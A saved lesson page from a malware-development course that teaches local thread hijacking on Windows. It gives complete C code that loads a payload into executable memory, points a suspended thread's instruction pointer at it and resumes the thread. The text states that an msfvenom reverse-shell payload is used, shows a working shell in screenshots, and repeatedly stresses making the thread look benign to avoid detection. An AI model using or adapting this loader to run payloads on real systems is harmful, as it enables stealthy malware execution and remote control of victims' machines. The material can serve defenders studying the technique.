<!DOCTYPE html>
<html class="dark"><head>
<meta http-equiv="content-type" content="text/html; charset=UTF-8">
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <meta http-equiv="X-UA-Compatible" content="ie-edge">
        <meta name="csrf-token" content="aHzsquahomm2Bo0anbhiCgbZ1siEurCTfma8L6Pk">
        <link rel="stylesheet" href="Thread%20Hijacking%20-%20Local%20Thread%20Creation_files/template.css">
        <link rel="shortcut icon" href="#favicon.ico">
        <!-- fontawesome for icons -->
        <link rel="stylesheet" href="Thread%20Hijacking%20-%20Local%20Thread%20Creation_files/font-awesome.min.css">
        <!-- google fonts -->
        <link rel="preconnect" href="https://fonts.gstatic.com/">
        <link href="Thread%20Hijacking%20-%20Local%20Thread%20Creation_files/css2.css" rel="stylesheet">
        <link href="Thread%20Hijacking%20-%20Local%20Thread%20Creation_files/css2_002.css" rel="stylesheet">
        <title>Thread Hijacking - Local Thread Creation</title>
        <!-- Custom css files, order matters -->
        <link rel="preload" as="style" href="Thread%20Hijacking%20-%20Local%20Thread%20Creation_files/app.fdbb573b.css"><link rel="stylesheet" href="Thread%20Hijacking%20-%20Local%20Thread%20Creation_files/app.fdbb573b.css"><link rel="stylesheet" href="Thread%20Hijacking%20-%20Local%20Thread%20Creation_files/viewer.css">
    </head>
    <body>
        <nav id="navbar" class="px-2 sm:px-4 py-2.5 bg-gray-900 sticky hidden">
    <div class="container flex flex-wrap justify-between mx-auto">
      <a data-target="_self" href="#" class="flex items-center">
        <div class="main-logo flex flex-row items-center">
            <span class="text-xl logo-font text-white">MALDEV</span>
            <img class="w-[25px] mx-2 relative bottom-1" src="Thread%20Hijacking%20-%20Local%20Thread%20Creation_files/logo-bug-2.png" alt="Logo">   
            <span class="text-xl logo-font text-white">ACADEMY</span>          
        </div>
      </a>
      <button data-collapse-toggle="navbar-default" id="navbar-phone-btn" type="button" class="inline-flex items-center p-2 ml-3 text-sm text-gray-500 rounded-lg md:hidden hover:bg-gray-100 focus:outline-none focus:ring-2 focus:ring-gray-200 dark:text-gray-400 dark:hover:bg-gray-700 dark:focus:ring-gray-600" aria-controls="navbar-default" aria-expanded="false">
        <span class="sr-only">Open main menu</span>
        <svg class="w-6 h-6" aria-hidden="true" fill="currentColor" viewBox="0 0 20 20" xmlns="http://www.w3.org/2000/svg"><path fill-rule="evenodd" d="M3 5a1 1 0 011-1h12a1 1 0 110 2H4a1 1 0 01-1-1zM3 10a1 1 0 011-1h12a1 1 0 110 2H4a1 1 0 01-1-1zM3 15a1 1 0 011-1h12a1 1 0 110 2H4a1 1 0 01-1-1z" clip-rule="evenodd"></path></svg>
      </button>
      <div class="hidden w-full md:block md:w-auto" id="navbar-default">
        <ul class="flex flex-col items-center p-4 mt-4 bg-gray-50 rounded-lg border border-gray-100 md:flex-row md:space-x-8 md:mt-0 md:text-sm md:font-medium md:border-0 md:bg-white dark:bg-gray-800 md:dark:bg-gray-900 dark:border-gray-700">
          <li>
            <a data-target="_self" href="#" class="block py-2 pr-4 pl-3 text-gray-400 md:p-0">Home</a>
          </li>
          <li>
            <a data-target="_self" href="#faq" class="block py-2 pr-4 pl-3 text-gray-400 md:p-0">FAQ</a>
          </li>
          <li>
            <a data-target="_self" href="#syllabus" class="block py-2 pr-4 pl-3 text-gray-400 md:p-0">Syllabus</a>
          </li>
                              <li>
            <a data-target="_self" href="#pricing" class="block py-2 pr-4 pl-3 text-gray-400 md:p-0">Pricing</a>
          </li>
                                        <li>
            <a data-target="_self" href="#profile" class="block py-2 pr-4 pl-3 text-gray-400 md:p-0">Profile</a>
          </li>
          <li>
            <form action="#logout" method="POST">
            <input type="hidden" name="_token" value="aHzsquahomm2Bo0anbhiCgbZ1siEurCTfma8L6Pk">              <button type="submit" class="block py-2 pr-4 pl-3 text-gray-400 md:p-0">Logout</button>
            </form>
          </li>
          <li class="mt-4 md:mt-0">
            <a data-target="_self" href="#modules" class="text-white bg-blue-700 hover:bg-blue-800 font-medium rounded-lg text-sm px-5 py-2.5 text-center md:mr-3 mr-0 dark:bg-blue-600 dark:hover:bg-blue-700 dark:focus:ring-blue-800">Modules</a>
          </li>
                  </ul>
      </div>
    </div>
  </nav>        <div class="bg-gray-900 p-4">
    <div class="flex">
        <div class="md:flex-row flex-col flex md:items-center w-1/2 bg-gray-700 border-l border-t border-gray-600 pl-4 pt-2 pb-2 rounded-tl">
            <div>
                Module 35 - Thread Hijacking - Local Thread Creation
            </div>
            <div class="ml-2 w-4 h-4 bg-orange-600 rounded-full"></div>
        </div>
        <div class="flex justify-end items-center w-1/2 bg-gray-700 pr-4 pt-2 pb-2 rounded-tr border-t border-r border-gray-600">
            <div class="enlarge-container pr-4">
                <img src="Thread%20Hijacking%20-%20Local%20Thread%20Creation_files/enlarge.svg" onclick="toggleScreenWidth()" class="hover:bg-gray-600 rounded-sm cursor-pointer" id="enlargeToggle" alt="Screen Width" width="20px">
            </div>
            <div class="objectives-container pr-4">
                <img src="Thread%20Hijacking%20-%20Local%20Thread%20Creation_files/objectives.svg" onclick="toggleObjectives()" class="hover:bg-gray-600 cursor-pointer" id="objectivesToggle" alt="Objectives" width="20px">
            </div>
            <div class="terminal-container  pr-4 ">
                <img src="Thread%20Hijacking%20-%20Local%20Thread%20Creation_files/ide.svg" onclick="toggleIde()" class="hover:bg-gray-600 rounded-sm cursor-pointer" id="terminalToggle" alt="Terminal" width="22px">
            </div>
                                    <div class="dl-container">
                <a href="#download/file/LocalThreadHijacking" target="_blank">
                    <img src="Thread%20Hijacking%20-%20Local%20Thread%20Creation_files/dl.svg" class="hover:bg-gray-600 rounded-full cursor-pointer" alt="Download" width="20px">
                </a>
            </div>
                                </div>
    </div>
    <div id="height-container" class="flex h-full min-h-[800px]">
        <div class="flex max-w-full min-w-full">
            <div id="description-container" class="viewer code-description h-full bg-gray-800 p-4 border-r border-l border-b border-gray-600 px-5 md:px-10 lg:px-20 w-full"><div class="toastui-editor-contents" style="overflow-wrap: break-word;">
            <h2>Thread Hijacking - Local Thread Creation</h2>
<h3>Introduction</h3>
<p><a href="https://attack.mitre.org/techniques/T1055/003/" target="_blank">Thread Execution Hijacking</a>
 is a technique that can execute a payload without the need of creating a
 new thread. The way this technique works by suspending the thread and 
updating the register that points to the next instruction in memory to 
point to the start of the payload. When the thread resumes execution, 
the payload is executed.</p>
<p>This module will use the Msfvenom TCP reverse shell payload rather 
than the calc payload. The reverse shell payload is used because it 
keeps the thread running after execution whereas the calc payload would 
terminate the thread after execution. Regardless, both payloads work but
 having the thread still running after execution allows for further 
analysis.</p>
<h3>Thread Context</h3>
<p>Before the technique can be explained, <em>thread context</em> must 
be understood. Every thread has a scheduling priority and maintains a 
set of structures that the system saves to the thread's context. Thread 
context includes all the information the thread needs to seamlessly 
resume execution, including the thread's set of CPU registers and stack.</p>
<p><a href="https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-getthreadcontext" target="_blank">GetThreadContext</a> and <a href="https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-setthreadcontext" target="_blank">SetThreadContext</a> are two WinAPIs that can be used to retrieve and set a thread's context, respectively.</p>
<p><code>GetThreadContext</code> populates a <a href="https://learn.microsoft.com/en-us/windows/win32/api/winnt/ns-winnt-context" target="_blank">CONTEXT</a> structure that contains all the information about the thread. Whereas, <code>SetThreadContext</code> takes a populated <code>CONTEXT</code> structure and sets it to the specified thread.</p>
<p>These two WinAPIs will play a crucial role in thread hijacking and 
therefore it would be beneficial to review the WinAPIs and their 
associated parameters.</p>
<h3>Thread Hijacking vs Thread Creation</h3>
<p>The first question that needs to be addressed is why hijack a created
 thread to execute a payload instead of executing the payload using a 
newly created thread.</p>
<p>The main difference is payload exposure and stealth. Creating a new 
thread for payload execution will expose the base address of the 
payload, and thus the payload's content because a new thread's entry 
must point to the payload's base address in memory. This is not the case
 with thread hijacking because the thread's entry would be pointing at a
 normal process function and therefore the thread would appear benign.</p>
<h4>CreateThread WinAPI</h4>
<p><code>CreateThread</code>'s third parameter, <code>LPTHREAD_START_ROUTINE lpStartAddress</code>, specifies the address of the thread's entry. Using thread creation, <code>lpStartAddress</code> will point to the payload's address. On the other hand, thread hijacking will point to a benign function.</p>
<pre><code>HANDLE CreateThread(
  [in, optional]  LPSECURITY_ATTRIBUTES   lpThreadAttributes,
  [in]            SIZE_T                  dwStackSize,
  [in]            LPTHREAD_START_ROUTINE  lpStartAddress, // Thread Entry
  [in, optional]  __drv_aliasesMem LPVOID lpParameter,
  [in]            DWORD                   dwCreationFlags,
  [out, optional] LPDWORD                 lpThreadId
);
</code></pre>
<p>The description of the third parameter is shown below.</p>
<p><img src="Thread%20Hijacking%20-%20Local%20Thread%20Creation_files/start-address-param.png" alt="Image"></p>
<h3>Local Thread Hijacking Steps</h3>
<p>This section describes the required steps to perform thread hijacking on a thread created in the local process.</p>
<h4>Creating The Target Thread</h4>
<p>The prerequisite to performing thread hijacking is finding a running 
thread to hijack. It should be noted that it's not possible to hijack a 
local process's main thread because the targeted thread needs to first 
be placed in a suspended state. This is problematic when targeting the 
main thread since it is the one that executes the code and cannot be 
suspended. Therefore, do not target the main thread when performing 
local thread hijacking.</p>
<p>This module will demonstrate hijacking a newly created thread. <code>CreateThread</code>
 will initially be called to create a thread and set a benign function 
as the thread's entry. Afterward, the thread's handle will be used to 
perform the necessary steps to hijack the thread and execute the payload
 instead.</p>
<h4>Modifying The Thread's Context</h4>
<p>The next step is to retrieve the thread's context in order to modify 
it and make it point at a payload. When the thread resumes execution, 
the payload is executed.</p>
<p>As previously mentioned, <code>GetThreadContext</code> will be used to retrieve the target thread's <code>CONTEXT</code> structure. Certain values of the structure will be modified to modify the current thread's context using <code>SetThreadContext</code>.
 The values that are being changed in the structure are the ones that 
decide what the thread will execute next. These values are the <code>RIP</code> (for 64-bit processors) or <code>EIP</code> (for 32-bit processors) registers.</p>
<p>The <code>RIP</code> and <code>EIP</code> registers, also known as the <em>instruction pointer register</em>, point to the next instruction to execute. They are updated after each instruction is executed.</p>
<h4>Setting ContextFlags</h4>
<p>Notice how the <code>GetThreadContext</code>'s second parameter, <code>lpContext</code>, is marked as an IN &amp; OUT parameter. The <a href="https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-getthreadcontext#remarks" target="_blank">Remarks section</a> in Microsoft's documentation states:</p>
<p><em>The function retrieves a selective context based on the value of the ContextFlags member of the context structure.</em></p>
<p>Essentially Microsoft is stating that <code>CONTEXT.ContextFlags</code> must be set to a value before calling the function. <code>ContextFlags</code> is set to the <code>CONTEXT_CONTROL</code> flag to retrieve the value of the control registers.</p>
<p>Therefore, setting <code>CONTEXT.ContextFlags</code> to <code>CONTEXT_CONTROL</code> is required to perform thread hijacking. Alternatively, <code>CONTEXT_ALL</code> can also be used to perform thread hijacking.</p>
<h3>Thread Hijacking Function</h3>
<p><code>RunViaClassicThreadHijacking</code> is a custom-built function that performs thread hijacking. The function requires 3 arguments:</p>
<ul>
<li>
<p><code>hThread</code> - A handle to a <strong>suspended</strong> thread to be hijacked.</p>
</li>
<li>
<p><code>pPayload</code> - A pointer to the payload's base address.</p>
</li>
<li>
<p><code>sPayloadSize</code> - The size of the payload.</p>
</li>
</ul>
<pre><code>BOOL RunViaClassicThreadHijacking(IN HANDLE hThread, IN PBYTE pPayload, IN SIZE_T sPayloadSize) {
	
	PVOID    pAddress         = NULL;
	DWORD    dwOldProtection  = NULL;
	CONTEXT  ThreadCtx        = { 
		.ContextFlags = CONTEXT_CONTROL 
	};

    // Allocating memory for the payload
	pAddress = VirtualAlloc(NULL, sPayloadSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
	if (pAddress == NULL){
		printf("[!] VirtualAlloc Failed With Error : %d \n", GetLastError());
		return FALSE;
	}

	// Copying the payload to the allocated memory
	memcpy(pAddress, pPayload, sPayloadSize);

	// Changing the memory protection
	if (!VirtualProtect(pAddress, sPayloadSize, PAGE_EXECUTE_READWRITE, &amp;dwOldProtection)) {
		printf("[!] VirtualProtect Failed With Error : %d \n", GetLastError());
		return FALSE;
	}

	// Getting the original thread context
	if (!GetThreadContext(hThread, &amp;ThreadCtx)){
		printf("[!] GetThreadContext Failed With Error : %d \n", GetLastError());
		return FALSE;
	}

	// Updating the next instruction pointer to be equal to the payload's address 
	ThreadCtx.Rip = pAddress;

	// Updating the new thread context
	if (!SetThreadContext(hThread, &amp;ThreadCtx)) {
		printf("[!] SetThreadContext Failed With Error : %d \n", GetLastError());
		return FALSE;
	}

	return TRUE;
}
</code></pre>
<h3>Creating The Sacrificial Thread</h3>
<p>Since <code>RunViaClassicThreadHijacking</code> requires a handle to a
 thread, the main function would need to supply that. As previously 
mentioned, the targeted thread needs to be in a suspended state for <code>RunViaClassicThreadHijacking</code> to successfully hijack the thread.</p>
<p>The <code>CreateThread</code> WinAPI will be used to create a new 
thread. The new thread should appear as benign as possible to avoid 
detection. This can be achieved by making a benign function that gets 
executed by this newly created thread.</p>
<p>The next step is to suspend the newly created thread for <code>GetThreadContext</code> to succeed. This can be done in two ways:</p>
<ol>
<li>
<p>Passing <code>CREATE_SUSPENDED</code> flag in <code>CreateThread</code>'s <a href="https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-createthread#parameters" target="_blank">dwCreationFlags parameter</a>. That flag will create the thread in a suspended state.</p>
</li>
<li>
<p>Creating a normal thread, but suspending it later using the <a href="https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-suspendthread" target="_blank">SuspendThread</a> WinAPI.</p>
</li>
</ol>
<p>The first method will be used since it utilizes fewer WinAPI calls. 
However, both methods will require the thread to be resumed after 
executing <code>RunViaClassicThreadHijacking</code>. This will be achieved using the <a href="https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-resumethread" target="_blank">ResumeThread</a> WinAPI which only requires the handle of the suspended thread.</p>
<h3>Main Function</h3>
<p>To reiterate, the main function will create a sacrificial thread in a
 suspended state. The thread will be initially running a benign dummy 
function which will then be hijacked using <code>RunViaClassicThreadHijacking</code> to run the payload.</p>
<pre><code>int main() {
	
	HANDLE hThread = NULL;

	// Creating sacrificial thread in suspended state 
	hThread = CreateThread(NULL, NULL, (LPTHREAD_START_ROUTINE) &amp;DummyFunction, NULL, CREATE_SUSPENDED, NULL);
	if (hThread == NULL) {
		printf("[!] CreateThread Failed With Error : %d \n", GetLastError());
		return FALSE;
	}

	// Hijacking the sacrificial thread created
	if (!RunViaClassicThreadHijacking(hThread, Payload, sizeof(Payload))) {
		return -1;
	}

	// Resuming suspended thread, so that it runs our shellcode
	ResumeThread(hThread);
	
	printf("[#] Press &lt;Enter&gt; To Quit ... ");
	getchar();

	return 0;
}

</code></pre>
<h3>Demo</h3>
<p>The <code>mainCRTStartup</code> is the main thread running the main function and the <code>DummyFunction</code> thread is the sacrificial thread.</p>
<p><img src="Thread%20Hijacking%20-%20Local%20Thread%20Creation_files/threadhijack-208833406-0c1bb9f4-9a41-46e0-a2d5-b05f71c6c287.png" alt="Image"></p>
<br>
<p>The image below shows the hijacked process establishing a network connection. This means the payload was successfully executed.</p>
<p><img src="Thread%20Hijacking%20-%20Local%20Thread%20Creation_files/threadhijack-308833564-0000d447-c970-40d8-8be3-8da70b63f30f.png" alt="Image"></p>
<br>
<p>Successful reverse shell connection.</p>
<p><img src="Thread%20Hijacking%20-%20Local%20Thread%20Creation_files/threadhijack-408833616-43a64b68-f30e-466c-a4c6-4d48289c0158.png" alt="Image"></p>

            </div></div>
            <div id="accessory-container" class="hidden flex flex-col w-1/4 min-w-1/4 h-full">
                <div id="objectives" class="hidden p-4 border-r border-b bg-gray-900 border-gray-600 font-code w-full h-1/2">
                    <div class="w-full bg-gray-700 text-center mb-4 font-sans text-lg">Objectives</div>
                                                                        
                                                                        
            <div class="flex items-center mb-2 font-sans">
                                <input type="checkbox" id="objective-0" data-objective-id="0" class="flex-none w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300 focus:ring-blue-500 dark:focus:ring-blue-600 dark:ring-offset-gray-800 focus:ring-2 dark:bg-gray-700 dark:border-gray-600">
                                <label class="ml-2 text-sm font-medium text-gray-900 dark:text-gray-300">Create a suspended thread and then resume it</label>
                            </div>
                                                                        
                                                                        
                    <div class="flex items-center mb-2 font-sans">
                                <input type="checkbox" id="objective-1" data-objective-id="1" class="flex-none w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300 focus:ring-blue-500 dark:focus:ring-blue-600 dark:ring-offset-gray-800 focus:ring-2 dark:bg-gray-700 dark:border-gray-600">
                                <label class="ml-2 text-sm font-medium text-gray-900 dark:text-gray-300">Implement local thread hijacking to run a 32-bit payload on a 32-bit system (Hint: update the EIP register)</label>
                            </div>
                                                                        
                                                                        
                    <div class="flex items-center mb-2 font-sans">
                                <input type="checkbox" id="objective-2" data-objective-id="2" class="flex-none w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300 focus:ring-blue-500 dark:focus:ring-blue-600 dark:ring-offset-gray-800 focus:ring-2 dark:bg-gray-700 dark:border-gray-600">
                                <label class="ml-2 text-sm font-medium text-gray-900 dark:text-gray-300">Modify the code to create a normal thread and then suspend it using the SuspendThread WinAPI</label>
                            </div>
                                                                                  
                </div>
                <div id="ide" class="hidden p-4 border-r border-b border-gray-600 font-code w-full h-1/2">
                    <textarea class="bg-gray-900 outline-0 w-full h-full resize-none font-sans" placeholder="Write temporary notes or code here"></textarea>
                </div>
            </div>  
        </div>
      </div>
      <div class="flex">
        <div class="flex flex-row flex-wrap justify-center items-center w-full bg-gray-700 border-r border-l border-gray-600 pl-4 pt-2 pb-2 rounded-bl rounded-br">
                        <div class="mr-2">
                <a data-target="_self" href="#modules/34"><button class="w-[100px] h-10 px-5 text-sm duration-150 text-white bg-blue-700 hover:bg-blue-800 rounded-lg focus:shadow-outline">Previous</button></a>           
            </div>
                        <div class="mr-2">
                <a data-target="_self" href="#modules"><button class="w-[100px] h-10 px-5 text-sm duration-150 text-white bg-blue-700 hover:bg-blue-800 rounded-lg focus:shadow-outline">Modules</button></a>           
            </div>
            <div class="my-2 mr-2">
            <form id="complete-module" action="#modules/35/complete" method="POST">
                <input type="hidden" name="_token" value="aHzsquahomm2Bo0anbhiCgbZ1siEurCTfma8L6Pk">                <button id="complete-btn" class="w-[100px] h-10 px-5 text-white text-sm duration-150 bg-green-700 rounded-lg focus:shadow-outline hover:bg-green-800 ">Complete</button>
            </form>
            <form id="uncomplete-module" action="#modules/35/progress" method="POST">
                <input type="hidden" name="_token" value="aHzsquahomm2Bo0anbhiCgbZ1siEurCTfma8L6Pk">                <button id="uncomplete-btn" class="w-[100px] h-10 px-5 text-white text-sm duration-150 bg-red-700 rounded-lg focus:shadow-outline hover:bg-red-800 hidden">Undo</button>
            </form>
            </div>
                                    <div class="mr-2">
                <a data-target="_self" href="#modules/36"><button class="w-[100px] h-10 px-5 text-sm duration-150 text-white bg-blue-700 hover:bg-blue-800 rounded-lg focus:shadow-outline">Next</button></a>           
            </div>
                    </div>
    </div>
</div>

<footer id="footer" class="text-gray-400 border-t-[1px] border-gray-700 bg-gray-900 body-font hidden">
    <div class="container px-5 py-8 mx-auto flex items-center sm:flex-row flex-col">
      <p class="text-sm text-gray-400 sm:ml-4 sm:pl-4 sm:border-gray-800 sm:py-2 sm:mt-0 mt-4">© 2023 MalDev Academy</p>
        <a href="#" target="_blank" class="text-gray-500 hover:text-white ml-2">
            <svg class="w-5 h-5" fill="currentColor" viewBox="0 0 24 24" aria-hidden="true"><path d="M8.29 20.251c7.547 0 11.675-6.253 11.675-11.675 0-.178 0-.355-.012-.53A8.348 8.348 0 0022 5.92a8.19 8.19 0 01-2.357.646 4.118 4.118 0 001.804-2.27 8.224 8.224 0 01-2.605.996 4.107 4.107 0 00-6.993 3.743 11.65 11.65 0 01-8.457-4.287 4.106 4.106 0 001.27 5.477A4.072 4.072 0 012.8 9.713v.052a4.105 4.105 0 003.292 4.022 4.095 4.095 0 01-1.853.07 4.108 4.108 0 003.834 2.85A8.233 8.233 0 012 18.407a11.616 11.616 0 006.29 1.84"></path></svg>
        </a>
      <span class="inline-flex sm:ml-auto sm:mt-0 mt-4 justify-center sm:justify-start">
        <a class="text-gray-400 text-sm" href="/" target="_blank">
#      </a></span><a class="text-gray-400 text-sm" href="/" target="_blank">
    </a></div><a class="text-gray-400 text-sm" href="/" target="_blank">
  </a></footer><a class="text-gray-400 text-sm" href="/" target="_blank">        

        <script src="Thread%20Hijacking%20-%20Local%20Thread%20Creation_files/jquery-3.6.0.min.js"></script>
        <script src="Thread%20Hijacking%20-%20Local%20Thread%20Creation_files/bootstrap.min.js"></script>
        <link rel="preload" as="style" href="Thread%20Hijacking%20-%20Local%20Thread%20Creation_files/app.4474f4d1.css"><link rel="modulepreload" href="Thread%20Hijacking%20-%20Local%20Thread%20Creation_files/app.5f3af5ce.js"><link rel="stylesheet" href="Thread%20Hijacking%20-%20Local%20Thread%20Creation_files/app.4474f4d1.css"><script type="module" src="Thread%20Hijacking%20-%20Local%20Thread%20Creation_files/app.5f3af5ce.js"></script><script src="Thread%20Hijacking%20-%20Local%20Thread%20Creation_files/navbar.js"></script>
<script src="Thread%20Hijacking%20-%20Local%20Thread%20Creation_files/moduleviewer.js"></script>

 
<script>
$(document).ready(function() {
    $('a:not([data-target="_self"])').attr('target', '_blank');

    $('input[type=checkbox]').change(function() {
    var checked = $(this).is(':checked');
    var userId = 260;
    var moduleId = 35;
    var objectiveId = $(this).data('objective-id');
    $.ajax({
        url: checked ? "#complete/objective" : "#remove/objective",
        type: "POST",
        data: {
        _token: "aHzsquahomm2Bo0anbhiCgbZ1siEurCTfma8L6Pk",
        user_id: userId,
        module_id: moduleId,
        objective_id: objectiveId
        },
        success: function(response) {

        },
        error: function(xhr) {
        console.log('Error');
        }
    });
    });

    $('#complete-module').submit(function(event) {
    event.preventDefault(); // Prevent default form submission

    var form = $(this);
    var url = form.attr('action');
    var data = form.serialize();
    var completeBtn = form.find('#complete-btn');
    var uncompleteBtn = $('#uncomplete-btn');

    $.ajax({
        type: 'POST',
        url: url,
        data: data,
        success: function(response) {
            completeBtn.addClass('hidden');
            uncompleteBtn.removeClass('hidden');
        },
        error: function(xhr) {
            console.log('Error');
        }
    });
});

$('#uncomplete-module').submit(function(event) {
    event.preventDefault(); // Prevent default form submission

    var form = $(this);
    var url = form.attr('action');
    var data = form.serialize();
    var completeBtn = $('#complete-btn');
    var uncompleteBtn = form.find('#uncomplete-btn');

    $.ajax({
        type: 'POST',
        url: url,
        data: data,
        success: function(response) {
            uncompleteBtn.addClass('hidden');
            completeBtn.removeClass('hidden');
        },
        error: function(xhr) {
            console.log('Error');
        }
    });
});
});
</script>
    
</a></body></html>